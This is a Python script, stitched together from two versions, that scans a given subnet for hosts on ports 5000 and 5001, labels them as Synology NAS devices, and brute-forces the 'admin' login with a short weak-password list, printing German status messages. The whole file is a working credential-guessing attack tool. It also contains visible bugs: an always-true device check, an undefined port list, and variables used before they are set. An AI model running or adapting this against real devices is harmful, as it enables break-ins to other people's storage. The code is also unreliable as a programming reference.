#!/usr/bin/python3
import subprocess
import argparse
import re
import requests
from bs4 import BeautifulSoup
import mechanicalsoup
import ipaddress
import socket
import concurrent.futures

ip_dict= {}
ip_dict_validated = {}
ports=[5000, 5001]
pwd_list=['admin','1234','123456',]

def scan_ip(ip, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(2)
    result = sock.connect_ex((str(ip),port))
    if result == 0:
        ip_dict[str(ip)]=port

    return ip_dict

def force(ip, port):
    browser = mechanicalsoup.StatefulBrowser()
    try:
        browser.open("http://"+ip+":"+str(port))
        browser.get_current_page()
        browser.select_form()
        browser["username"]="admin"
        browser["passwd"]=pwd
        response = browser.submit_selected()
    except (mechanicalsoup.utils.LinkNotFoundError, requests.exceptions.SSLError, requests.packages.urllib3.exceptions.ProtocolError):
        pass

    if '"success" : "true"' in str(response.text):
        print ("Passwort '"+pwd+"' klappt fuer IP "+ip)
    
 
def validate(ip, port):

    try:
        r = requests.get('http://'+str(ip)+':'+str(port), timeout=2)
    except (requests.exceptions.Timeout, requests.exceptions.ConnectionError) :
        pass
    doc = BeautifulSoup(r.text, "html.parser")
    meta=doc.find_all("meta")

    if "Synology" or "syno" in str(meta):
        ip_dict_validated[ip]=port
    return ip_dict_validated


parser = argparse.ArgumentParser()
parser.add_argument("-scan", help="Scan Provided Subnet for port in Portlist", action="store")
parser.add_argument("-validate",help="Validate if the provided IP address belongs to an Synology NAS", action="store")
parser.add_argument("-force",help="Force Passwords for user admin", action="store")
args = parser.parse_args()

if args.scan:

    net4 = ipaddress.ip_network(args.scan)

    with concurrent.futures.ThreadPoolExecutor(100) as executor:
        threads = []

        for ip in net4.hosts():
            for port in ports:   

                executor.submit(scan_ip, ip, port)

    print("Scan durchgeführt, "+str(len(ip_dict))+" mögliche IP Addressen gefunden")

if args.validate:

    with concurrent.futures.ThreadPoolExecutor(100) as executor:
        threads = []

        for ip, port in ip_dict.items():
            executor.submit(validate, ip, port)

    print("Validate durchgeführt, von "+str(len(ip_dict))+" mögliche IP Addressen, wurden "+str(len(ip_dict_validated))+" validiert")

if args.force:

    with concurrent.futures.ThreadPoolExecutor(100) as executor:
        threads = []

        for ip, port in ip_dict_validated.items():
            print("Versuche IP "+ip)
            for pwd in pwd_list:

                executor.submit(force, ip, port)
    
print ('Fertig')
  

import subprocess
import argparse
import re
import requests
from bs4 import BeautifulSoup
import mechanicalsoup
import ipaddress
import socket
import concurrent.futures

ip_list=[]
ip_dict={}
ip_list_validated = []
ports=[5000, 5001]
#port_list=['5000', '5001']
pwd_list=['admin','1234','123456',]

#def scan(subnet):
#    print ("Scannining "+str(subnet)+" on port "+str(port_list))
#    nmap = subprocess.Popen(['nmap', subnet, '-p', "5000", '--open'])
#    ip_list = re.findall( r'[0-9]+(?:\.[0-9]+){3}', str(nmap))
#    return ip_list

def scan_ip(ip, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(2)
    result = sock.connect_ex((str(ip),port))
    if result == 0:
        ip_dict[ip]=port
        ip_list.append(str(ip))

    return ip_list

def force(nas_list):
    for ip in nas_list:
        for port in port_list:
            print("Versuche IP "+ip)
            for pwd in pwd_list:
                browser = mechanicalsoup.StatefulBrowser()
                try:
                    browser.open("http://"+ip+":"+port)
                    browser.get_current_page()
                    browser.select_form()
                    browser["username"]="admin"
                    browser["passwd"]=pwd
                    response = browser.submit_selected()
                except (mechanicalsoup.utils.LinkNotFoundError, requests.exceptions.SSLError, requests.packages.urllib3.exceptions.ProtocolError) as e:
                    continue

                if '"success" : true' in str(response.text):
                    print ("Passwort '"+pwd+"' klappt fuer IP "+ip)
    return


def validate(ip_list):
    for ip in ip_list:

        for port in port_list:
            try:
                r = requests.get('http://'+ip+':'+port, timeout=2)
            except requests.exceptions.Timeout:
                continue
            except requests.exceptions.ConnectionError:
                continue
            doc = BeautifulSoup(r.text, "html.parser")
            meta=doc.find_all("meta")

        if "Synology" or "syno" in str(meta):
            ip_list_validated.append(ip)
    return ip_list_validated


parser = argparse.ArgumentParser()
parser.add_argument("-scan", help="Scan Provided Subnet for port in Portlist", action="store")
parser.add_argument("-validate",help="Validate if the provided IP address belongs to an Synology NAS", action="store")
parser.add_argument("-force",help="Force Passwords for user admin", action="store")
args = parser.parse_args()

if args.scan:

    net4 = ipaddress.ip_network(args.scan)

    with concurrent.futures.ThreadPoolExecutor(100) as executor:
        threads = []

        for ip in net4.hosts():
            for port in ports:   

                executor.submit(scan_ip, ip, port)

    print (ip_list)
    print(ip_dict)

if args.validate:
    if args.scan:
        validate(ip_list)
    else:
        ip_list=[args.validate]
        validate(ip_list)
    for i in ip_list_validated:
        print(i)

if args.force:
    if args.scan:
        force(ip_list_validated)
    else:
        ip_list_validated=validate([args.force])
        force(ip_list_validated)
